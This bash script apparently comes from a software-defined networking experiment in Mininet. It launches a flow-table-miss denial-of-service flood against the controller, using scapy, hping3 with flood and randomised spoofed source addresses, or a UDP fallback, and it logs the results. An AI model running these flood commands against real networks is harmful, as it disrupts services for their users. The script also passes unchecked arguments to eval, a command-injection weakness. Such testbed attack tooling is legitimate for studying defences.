#!/usr/bin/env bash
set -euo pipefail

RATE=1200
SIZE=64
DURATION=90
TARGET=""
TARGET_PREFIX="10.0.0."
OUT="results/tmp"
CMD_PREFIX=""

# Main attack method:
# scapy = raw Ethernet table-miss attack
# hping3 = IP-layer flood backup/comparison
# udp = old fallback
METHOD="scapy"

# Interface name inside Mininet h2.
# Usually h2-eth0.
IFACE="h2-eth0"

while [ $# -gt 0 ]; do
  case "$1" in
    --rate) RATE="$2"; shift 2;;
    --size) SIZE="$2"; shift 2;;
    --duration) DURATION="$2"; shift 2;;
    --target) TARGET="$2"; shift 2;;
    --target-prefix) TARGET_PREFIX="$2"; shift 2;;
    --out) OUT="$2"; shift 2;;
    --cmd-prefix) CMD_PREFIX="$2"; shift 2;;
    --method) METHOD="$2"; shift 2;;
    --iface) IFACE="$2"; shift 2;;
    *) echo "Unknown arg: $1" >&2; exit 2;;
  esac
done

mkdir -p "$OUT"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

if [ "$METHOD" = "scapy" ]; then
  CMD="python3 '$SCRIPT_DIR/packetin_attack.py' \
    --method scapy \
    --iface '$IFACE' \
    --rate '$RATE' \
    --size '$SIZE' \
    --duration '$DURATION' \
    --log '$OUT/attack_sent.csv'"

elif [ "$METHOD" = "hping3" ]; then
  if [ -z "$TARGET" ]; then
    TARGET="10.0.0.3"
  fi

  # hping3 attack:
  # --udp         = UDP flood
  # --flood       = send as fast as possible
  # --rand-source = randomize source IPs to create many flow variations
  # -d SIZE       = payload size
  # -p 9999       = destination port
  CMD="timeout $DURATION bash -c '
    for p in 9991 9992 9993 9994 9995; do
      hping3 --udp --flood --rand-source -d $SIZE -p \$p $TARGET &
    done
    wait
  '"
elif [ "$METHOD" = "udp" ]; then
  CMD="python3 '$SCRIPT_DIR/packetin_attack.py' \
    --method udp \
    --rate '$RATE' \
    --size '$SIZE' \
    --duration '$DURATION' \
    --target-prefix '$TARGET_PREFIX' \
    --log '$OUT/attack_sent.csv'"

  if [ -n "$TARGET" ]; then
    CMD="python3 '$SCRIPT_DIR/packetin_attack.py' \
      --method udp \
      --rate '$RATE' \
      --size '$SIZE' \
      --duration '$DURATION' \
      --target '$TARGET' \
      --log '$OUT/attack_sent.csv'"
  fi

else
  echo "Unknown method: $METHOD" >&2
  exit 2
fi

if [ -n "$CMD_PREFIX" ]; then
  eval "$CMD_PREFIX $CMD" > "$OUT/attack_stdout.log" 2> "$OUT/attack_stderr.log" &
else
  eval "$CMD" > "$OUT/attack_stdout.log" 2> "$OUT/attack_stderr.log" &
fi

echo $! > "$OUT/attack.pid"
echo "attack_pid=$(cat "$OUT/attack.pid") method=$METHOD"